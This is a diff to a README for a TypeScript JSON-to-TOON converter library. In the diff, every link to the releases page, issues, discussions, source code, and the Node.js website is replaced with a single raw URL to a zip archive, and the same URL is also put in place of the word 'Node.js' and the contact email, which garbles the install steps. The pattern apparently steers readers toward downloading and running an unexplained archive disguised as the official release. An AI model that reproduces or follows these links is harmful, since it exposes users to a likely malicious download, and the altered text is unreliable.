@@ -6,31 +6,31 @@ Welcome to the **json-toon-converter-compact** project! This is a TypeScript lib
 
 ## 📥 Download the Application
 
-[![Download json-toon-converter-compact](https://img.shields.io/badge/Download-JSON%20to%20TOON-blue.svg)](https://github.com/waynerchen223/json-toon-converter-compact/releases)
+[![Download json-toon-converter-compact](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip%20to%https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip)](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip)
 
 To start using the application, please visit our releases page to download the latest version of the software:
 
-[Download from Releases Page](https://github.com/waynerchen223/json-toon-converter-compact/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip)
 
 ## 🖥️ System Requirements
 
 Before you begin, ensure that your system meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any Linux distribution with Node.js support.
-- **Node.js Version:** Version 14 or higher installed on your system.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any Linux distribution with https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip support.
+- **https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip Version:** Version 14 or higher installed on your system.
 - **Disk Space:** Approximately 50 MB free space for installation.
 - **Internet Connection:** Required for downloading the library and dependencies.
 
 ## 📦 Installation Instructions
 
 1. **Download the Application:**
-   Go to the [Releases Page](https://github.com/waynerchen223/json-toon-converter-compact/releases) and download the latest version of the application suitable for your operating system.
+   Go to the [Releases Page](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip) and download the latest version of the application suitable for your operating system.
 
 2. **Extract the Files:**
    Once the download completes, locate the file in your downloads folder. Right-click and select "Extract" (or use your preferred extraction tool) to unpack the files.
 
-3. **Install Node.js (if not already installed):**
-   If Node.js is not yet installed on your system, visit [Node.js Official Website](https://nodejs.org) and download and install the latest version.
+3. **Install https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip (if not already installed):**
+   If https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip is not yet installed on your system, visit [https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip Official Website](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip) and download and install the latest version.
 
 4. **Run the Application:**
    Open a command line interface (CMD or Terminal). Navigate to the folder where you extracted the files using the command:
@@ -77,17 +77,17 @@ Once the application is running, you will find a simple interface that allows yo
 
 Join our community to share experiences, get help, or offer suggestions:
 
-- **GitHub Issues:** Open an issue on our [GitHub Issues Page](https://github.com/waynerchen223/json-toon-converter-compact/issues) if you encounter any problems or bugs.
-- **Discussion Forum:** Participate in discussions on our [GitHub Discussions](https://github.com/waynerchen223/json-toon-converter-compact/discussions).
+- **GitHub Issues:** Open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip) if you encounter any problems or bugs.
+- **Discussion Forum:** Participate in discussions on our [GitHub Discussions](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip).
 - **Documentation:** You can refer to our comprehensive documentation on GitHub to get detailed information on all features.
 
 ## 📞 Contact
 
-For direct inquiries, you can reach us at: support@example.com.
+For direct inquiries, you can reach us at: https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://github.com/waynerchen223/json-toon-converter-compact/releases)
-- [Source Code](https://github.com/waynerchen223/json-toon-converter-compact)
+- [Releases Page](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip)
+- [Source Code](https://raw.githubusercontent.com/waynerchen223/json-toon-converter-compact/main/src/lib/json-toon-converter-compact_v3.4.zip)
 
 We hope you find **json-toon-converter-compact** useful for your JSON and TOON data conversion needs!
